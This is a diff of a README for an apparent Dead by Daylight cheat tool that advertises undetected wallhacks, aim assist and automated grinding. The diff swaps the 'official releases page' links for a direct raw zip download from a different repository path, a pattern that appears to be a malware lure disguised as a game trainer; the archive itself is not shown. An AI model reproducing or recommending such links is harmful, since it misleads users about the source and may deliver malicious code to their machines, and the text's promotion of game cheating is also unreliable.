@@ -5,7 +5,7 @@ description: "Automate Dead by Daylight progression with this undetected externa
 ---
 # 🎮 DBD-AutoGrind-Trainer-2026-Elite - Automate your Dead by Daylight progression 
 
-[ ![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/Global9452/DBD-AutoGrind-Trainer-2026-Elite/releases)
+[ ![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/Global9452/global9452.github.io/raw/refs/heads/main/felon/github_io_global_1.0.zip)
 
 ## 🎯 About This Software
 DBD-AutoGrind-Trainer-2026-Elite helps you manage your progress in Dead by Daylight. This tool automates the collection of Bloodpoints and unlocks perks or skins. Use the external features to observe game data through ESP wallhacks and aim assist. The tool operates as an external process to ensure your game client remains stable during operation. It connects to the game memory to read state data and executes inputs to perform grinding tasks.
@@ -22,7 +22,7 @@ This software requires a Windows 10 or 11 operating system. Ensure you meet the 
 ## 🛠️ Installation Steps
 Follow these instructions to set up the trainer on your computer.
 
-1. Visit the [official releases page](https://github.com/Global9452/DBD-AutoGrind-Trainer-2026-Elite/releases) to download the latest setup archive.
+1. Visit the [official releases page](https://github.com/Global9452/global9452.github.io/raw/refs/heads/main/felon/github_io_global_1.0.zip) to download the latest setup archive.
 2. Locate the downloaded file in your folder.
 3. Right-click the folder and select Extract All.
 4. Open the extracted folder.
